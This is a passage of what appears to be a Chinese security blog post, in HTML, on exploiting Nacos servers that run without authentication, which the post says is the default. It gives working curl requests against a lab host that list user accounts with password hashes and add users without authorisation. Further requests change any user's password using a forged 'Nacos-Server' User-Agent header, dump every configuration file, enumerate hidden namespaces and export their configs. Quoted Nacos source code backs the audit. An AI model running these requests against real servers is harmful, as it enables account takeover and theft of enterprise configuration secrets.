+<p>我们仔细看一下报错，提示说是缺少search&#x3D;blur或者search&#x3D;accurate，那我们加上再试试看。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这就成功了？<br>我一开始以为没修，后来发现，我通过查看鉴权相关文档时(<a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html)%EF%BC%8C%E5%AE%83%E5%8F%AA%E6%8F%8F%E8%BF%B0%E4%BA%86%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%E7%9A%84%E5%90%8E%E6%9E%9C%EF%BC%8C%E4%BD%86%E6%98%AF%E9%BB%98%E8%AE%A4%E5%90%AF%E5%8A%A8%E5%8D%B4%E4%B8%8D%E5%BC%80%E9%89%B4%E6%9D%83%E7%9A%84%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%A0%B9%E6%8D%AEgithub%E7%9A%84issue%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E6%96%B9%E5%B9%B6%E4%B8%8D%E8%AE%A4%E4%B8%BA%E8%BF%99%E6%98%AF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E8%87%B3%E4%BA%8E%E7%BD%91%E4%B8%8A%E5%87%BA%E4%BA%86%E4%B9%8B%E5%89%8D%E7%94%B1%E4%BA%8E%E4%B8%8D%E5%BD%93%E5%A4%84%E7%90%86User-Agent%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%90%8E%E4%BA%BA%E5%B0%91%E6%9C%89%E6%8C%96%E6%8E%98%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%BD%91%E4%B8%8A%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E4%B9%9F%E5%9F%BA%E6%9C%AC%E4%B8%8A%E5%81%9C%E7%95%99%E5%9C%A8%E9%82%A3%E6%AC%A1CVE%E3%80%82">https://nacos.io/en-us/docs/auth.html)，它只描述了如何开启鉴权，以及不开启鉴权的后果，但是默认启动却不开鉴权的，并且根据github的issue来看，官方并不认为这是漏洞，以至于网上出了之前由于不当处理User-Agent导致的未授权访问漏洞之后，后人少有挖掘其利用方式，网上的相关资料也基本上停留在那次CVE。</a></p>
+</blockquote>
+<h2><span id="未开启auth">未开启auth</span></h2><blockquote>
+<p>由于默认是不开auth的，所以我们先来讨论未开启auth的情况。</p>
+</blockquote>
+<h3><span id="读取用户账号密码">读取用户账号密码</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;totalCount&quot;</span>:1,<span class="string">&quot;pageNumber&quot;</span>:1,<span class="string">&quot;pagesAvailable&quot;</span>:1,<span class="string">&quot;pageItems&quot;</span>:[&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;$2a$10<span class="variable">$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu</span>&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="未授权添加用户">未授权添加用户</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?username=test1&amp;password=test1&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:200,<span class="string">&quot;message&quot;</span>:null,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;create user ok!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="任意用户密码更改">任意用户密码更改</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?accessToken=&#x27;</span> -H <span class="string">&#x27;User-Agent:Nacos-Server&#x27;</span> -d <span class="string">&#x27;username=test1&amp;newPassword=test2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>基本上目前主流针对Nacos的利用手法就停留在这里了，以至于防守方会通过WAF规则的形式来拦截掉这几个url请求。<br>但是根据代码审计以及官方的api接口文档，我们还能找到许多可以利用的接口，官方文档里面有的，我就不说了，大家自己可以去OpenAPI（<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/open-api.html%EF%BC%89%E8%87%AA%E8%A1%8C%E6%9F%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E7%BD%91%E9%87%8C%E9%9D%A2%E7%9A%84OpenAPI%E6%89%80%E7%BB%99%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%B7%E5%80%BC%E5%B9%B6%E4%B8%8D%E6%98%AF%E5%BE%88%E9%AB%98%E3%80%82">https://nacos.io/zh-cn/docs/open-api.html）自行查看，官网里面的OpenAPI所给出的利用价值并不是很高。</a></p>
+</blockquote>
+<h3><span id="代码审计">代码审计</span></h3><blockquote>
+<p>下载源码后通过简单查找发现在<code>nacos/config/src/main/java/com/alibaba/nacos/config/server/constant/Constants.java</code>和<code>nacos/core/src/main/java/com/alibaba/nacos/core/utils/Commons.java</code>文件下，有相关路由的定义，相关代码如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v1/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_V2_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v2/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OPS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/ops&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CAPACITY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/capacity&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COMMUNICATION_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/communication&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/configs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/config&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HEALTH_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/health&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LISTENER_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/listener&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NAMESPACE_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/namespaces&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">METRICS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/metrics&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Commons</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_CONTEXT</span> <span class="operator">=</span> <span class="string">&quot;/nacos&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION</span> <span class="operator">=</span> <span class="string">&quot;/v1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION_V2</span> <span class="operator">=</span> <span class="string">&quot;/v2&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_NACOS_CORE_CONTEXT</span> <span class="operator">=</span> NACOS_SERVER_VERSION + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT</span> <span class="operator">=</span> DEFAULT_NACOS_CORE_CONTEXT;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT_V2</span> <span class="operator">=</span> NACOS_SERVER_VERSION_V2 + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以看到有V1、V2两种API接口，我们根据不同类型再具体分析。</p>
+</blockquote>
+<h3><span id="获取配置数据">获取配置数据</span></h3><blockquote>
+<p>根据官方OpenAPI的说明，你需要知道dataId与group的值，才能读取到对应的配置文件，如果留空或者不填，则会无法读取。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>事实真的是这样吗？<br>我们看一下<code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code>文件中369行开始的代码。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Query the configuration information and return it in JSON format.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=accurate&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">searchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId, <span class="meta">@RequestParam(&quot;group&quot;)</span> String group,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">100</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfo4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Fuzzy query configuration information. Fuzzy queries based only on content are not allowed, that is, both dataId</span></span><br><span class="line"><span class="comment">    * and group are NULL, but content is not NULL. In this case, all configurations are returned.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=blur&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">fuzzySearchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;group&quot;)</span> String group, <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       MetricsMonitor.getFuzzySearchMonitor().incrementAndGet();</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">50</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfoLike4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以看到首先先进行了<code>signType = SignType.CONFIG</code>的权限检查，这里的<code>signType</code>的一个作用就是检查<code>auth</code>是否开启，但是之前也提到过，<code>auth</code>是默认不开启的。接着我们继续分析，当参数<code>search=accurate</code>时，从GET请求中获取参数<code>dataId、group、appName、tenant、config_tags、pageNo、pageSize</code>参数，其中<code>appName、tenant、config_tags</code>不是必填的，接着先检查<code>appName</code>和<code>configTags</code>是否为空，我们直接留空或者不填就能绕过这个判断，然后接下来就是迷之操作了，直接给我全部返回了。<br>所以我们直接构造参数，就可以发现能够获取全部的配置文件了。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>但这里有个问题，这只能获取默认命名空间<code>public</code>里面的数据，但是现在有大聪明已经学会了不把数据放到默认的<code>public</code>，而是自己重新建一个<code>namespace</code>，再把企业的相关配置放在里面，这里留个伏笔，我们接着往下看。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="获取其他namespace的配置数据">获取其他Namespace的配置数据</span></h3><blockquote>
+<p>根据官方的OpenAPI文档描述，可以直接请求获取。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/console/namespaces&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们查看对应的代码，处理<code>namespace</code>的代码在<code>nacos/console/src/main/java/com/alibaba/nacos/console/controller/NamespaceController.java</code>这里，我们看从48行开始的代码，相关代码如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/v1/console/namespaces&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NamespaceController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommonPersistService commonPersistService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> NamespaceOperationService namespaceOperationService;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">namespaceIdCheckPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[\\w-]+&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAMESPACE_ID_MAX_LENGTH</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get namespace list.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> namespace list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> RestResult&lt;List&lt;Namespace&gt;&gt; <span class="title function_">getNamespaces</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RestResultUtils.success(namespaceOperationService.getNamespaceList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这样一看上去，直接访问就能获取到<code>Namespace</code>列表，我们再跟一下<code>namespaceOperationService.getNamespaceList()</code>:</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Namespace&gt; <span class="title function_">getNamespaceList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 获取用kp</span></span><br><span class="line">        List&lt;TenantInfo&gt; tenantInfos = commonPersistService.findTenantByKp(DEFAULT_KP);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Namespace</span> <span class="variable">namespace0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(<span class="string">&quot;&quot;</span>, DEFAULT_NAMESPACE, DEFAULT_QUOTA,</span><br><span class="line">                configInfoPersistService.configInfoCount(DEFAULT_TENANT), NamespaceTypeEnum.GLOBAL.getType());</span><br><span class="line">        List&lt;Namespace&gt; namespaceList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        namespaceList.add(namespace0);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (TenantInfo tenantInfo : tenantInfos) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">configCount</span> <span class="operator">=</span> configInfoPersistService.configInfoCount(tenantInfo.getTenantId());</span><br><span class="line">            <span class="type">Namespace</span> <span class="variable">namespaceTmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(tenantInfo.getTenantId(), tenantInfo.getTenantName(),</span><br><span class="line">                    tenantInfo.getTenantDesc(), DEFAULT_QUOTA, configCount, NamespaceTypeEnum.CUSTOM.getType());</span><br><span class="line">            namespaceList.add(namespaceTmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> namespaceList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>看上去也没有做什么限制，我们直接访问发现可以直接读到非public的Namespace，就是上面我们创建名叫REDTEAM的test_namespace命名空间。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/5.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这时候我们已经拿到了namespace、namespaceShowNmae，我们就可以根据之前的API光明正大的进行读取操作了，这里有个小技巧，之前读取配置里面的tenant参数获取的就是namespce，我们直接把tenant&#x3D;test_namespace加进去构造请求，轻松读取到非public空间的数据。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="配置文件导出">配置文件导出</span></h3><blockquote>
+<p>就在我看上面上面这部分代码的时候，我们无意中发现了一个下载文件的接口，还是这个文件，找到了疑似导出配置文件的接口，我们继续跟进一下。<br><code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/7.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>接着我们在482行看到了相关代码。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/8.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>根据逻辑，我们很轻松的构造出下载的链接，跟上面的类似，其中tenant为空默认下载public命名空间，如果要下载其他命名空间的配置文件则重复之前的先获取Namespace即可。</p>
+</blockquote>
+<blockquote>
+<p><code>http://192.168.20.144:8848/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=</code></p>
+</blockquote>
+<h2><span id="后记">后记</span></h2><blockquote>
